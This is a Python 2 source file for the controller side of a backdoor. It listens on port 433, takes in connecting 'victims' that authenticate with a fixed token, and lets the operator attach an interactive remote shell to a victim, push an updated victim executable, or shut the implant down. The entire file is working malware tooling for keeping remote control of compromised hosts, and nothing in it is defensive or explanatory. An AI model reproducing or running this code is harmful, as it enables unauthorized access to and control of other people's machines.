#!/usr/bin/env python
# -*- coding: utf-8 -*-

import termios
import socket
import os
import sys
import fcntl
import struct
import signal
import select
import threading


# Get terminal width & height
def get_term_size():
    env = os.environ

    def ioctl_GWINSZ(fd):
        try:
            cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
        except:
            return
        return cr

    cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)

    if not cr:
        try:
            fd = os.open(os.ctermid(), os.O_RDONLY)
            cr = ioctl_GWINSZ(fd)
            os.close(fd)
        except:
            pass

    if not cr:
        cr = (env.get('LINES', 25), env.get('COLUMNS', 80))

    return int(cr[0]), int(cr[1])  # 宽,高

# Self-defined send call.
def wsend (sock, data):

    datalen = struct.pack('i', len(data))
    sock.sendall('%s' % datalen)
    sock.sendall(data)


# Self-defined recv call.
def wrecv (sock):
    # recv data len
    datalen = sock.recv(4)
    datalen = struct.unpack('i', datalen)[0]
    # recv data
    data = sock.recv(datalen)
    return data


# Get victim terminal
def attach_victim(vicsock):

    ctlwsrow, ctlwscol = get_term_size()
    # send terminal size to victim
    def sendws():

        data = struct.pack('2i2x2s', ctlwsrow, ctlwscol, 0xFF, 0xFF, 's', 's')
        wsend(vicsock, data)

    ctlterm = 'TERM=' + os.environ['TERM']
    print 'ctlwsrow:%d, ctlwscol:%d, ctlterm:%s' % (ctlwsrow, ctlwscol, ctlterm)

    # pack winsize & TERM data
    data = struct.pack('2i%ds'%len(ctlterm), ctlwsrow, ctlwscol, ctlterm)
    wsend(vicsock, data)

    # bind SIGWINCH handler
    signal.signal(signal.SIGWINCH, sendws)

    pid = os.getpid()
    slave = 0  # stdin
    pty = open(os.readlink('/proc/%d/fd/%d' % (pid, slave)), 'rb+')

    oldtermios = termios.tcgetattr(pty)
    newattr = termios.tcgetattr(pty)

    newattr[0] |= termios.IGNPAR
    newattr[0] &= ~(termios.ISTRIP|termios.INLCR|termios.IGNCR|termios.ICRNL|termios.IXON|termios.IXANY|termios.IXOFF)
    newattr[3] &= ~(termios.ISIG|termios.ICANON|termios.ECHO|termios.ECHOE|termios.ECHOK|termios.ECHONL|termios.IEXTEN)
    newattr[1] &= ~termios.OPOST
    newattr[6][termios.VMIN] = 1
    newattr[6][termios.VTIME] = 0

    termios.tcsetattr(pty, termios.TCSADRAIN, newattr)

    oldflags = fcntl.fcntl(pty, fcntl.F_GETFL)
    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags|os.O_NONBLOCK)

    while True:
        rr, rw, err = select.select([pty,vicsock], [], [], 1)
        if not (rr or rw or err):
            continue

        for s in rr:
            if s is vicsock:
                try:
                    data = wrecv(vicsock)
                    if (data == 'shell_exit_ok'):
                        termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                        fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                        print ''
                        return

                    pty.write(data)
                    pty.flush()
                except Exception, e:
                    termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                    print ''
                    return

            elif s is pty:
                try:
                    data = pty.read(8192)
                    data = struct.pack('%ds'%len(data), data)
                    wsend(vicsock, data)
                except Exception, e:
                    termios.tcsetattr(pty, termios.TCSAFLUSH, oldtermios)
                    fcntl.fcntl(pty, fcntl.F_SETFL, oldflags)
                    print ''
                    return



class ThreadWorker (threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.kill_received = False

    def run(self):
        global cntlsock, victims

        # local IP and PORT
        cntlip   = '0.0.0.0'
        cntlport = 433

        cntlsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        cntlsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cntlsock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        # trying to bind IP and PORT
        try:
            cntlsock.bind((cntlip, cntlport))
        except socket.error, v:
            errorcode = v[0]
            if errorcode in (errno.EPERM, errno.EACCES):
                print('You need to run it as root.')
            elif errorcode == errno.EADDRINUSE:
                print('The port already in use.')
            else:
                print('bind failed.')

            cntlsock.close()
            sys.exit(1)

        # listen
        cntlsock.listen(5)
        print('listening on '+ cntlip + ':' + str(cntlport))

        # try connection with victims.
        while not self.kill_received:
            rr, rw, err = select.select([cntlsock], [], [], 1)
            if rr:
                vicsock, vicaddr = cntlsock.accept()

                # get auth token from victim
                try:
                    authtoken = wrecv(vicsock)
                except Exception, e:
                    vicsock.shutdown(2)
                    vicsock.close()
                    continue

                if (authtoken <> 'helloserver'):
                    vicsock.shutdown(2)
                    vicsock.close()
                    continue

                # get nick from victim
                nick = wrecv(vicsock)
                uid = nick + '|' + vicaddr[0] + '|' + str(vicaddr[1])

                # send uid ok receipt
                uid_ok_receipt = struct.pack('6s', 'uid_ok')
                wsend(vicsock, uid_ok_receipt)

                # victim authorized
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                vicsock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

                victims.append((vicsock, uid))


# Send out victim executable.
def send_victim_exe(vicsock):
    update_file = 'vict'
    print 'filename: %s, filesize: %d, fnamelen: %d' % (update_file, os.stat(update_file).st_size, len(update_file))

    # send file name
    fname = struct.pack('%ds' % len(update_file), update_file)
    wsend(vicsock, fname)

    # send file size
    fsize = struct.pack('i', os.stat(update_file).st_size)
    wsend(vicsock, fsize)

    # send file mode
    fmode = struct.pack('i', os.stat(update_file).st_mode)
    wsend(vicsock, fmode)

    # send file
    sendsize  = 0
    totalsize = os.stat(update_file).st_size
    fo        = open(update_file, 'rb')
    # begin send
    while sendsize != totalsize:
        filedata = fo.read(1024)
        if not filedata:
            break
        vicsock.sendall(filedata)
        sendsize += len(filedata)

    fo.close()


if __name__ == '__main__':

    cntlsock = -1
    victims = []
    vicsock = -1

    # setup cntl and wait for victims
    wrk = ThreadWorker()
    wrk.setDaemon(True)
    wrk.start()

    cmd = ''
    while (cmd != 'exitc'):
        cmd = raw_input('# ')

        if cmd == 'get_victim' or cmd == 'shutdown_victim':
            vicsock = victims[0][0]
            # send command to victim
            pcmd = struct.pack('%ds' % len(cmd), cmd)
            wsend(vicsock, pcmd)
            if cmd == 'get_victim':
                attach_victim(vicsock)

        elif cmd == 'upgradev':
            vicsock = victims[0][0]
            pcmd = 'upgrade_victim'
            pcmd = struct.pack('%ds' % len(pcmd), pcmd)
            wsend(vicsock, pcmd)

            send_victim_exe(vicsock)

        elif cmd != 'exitc':
            os.system(cmd)

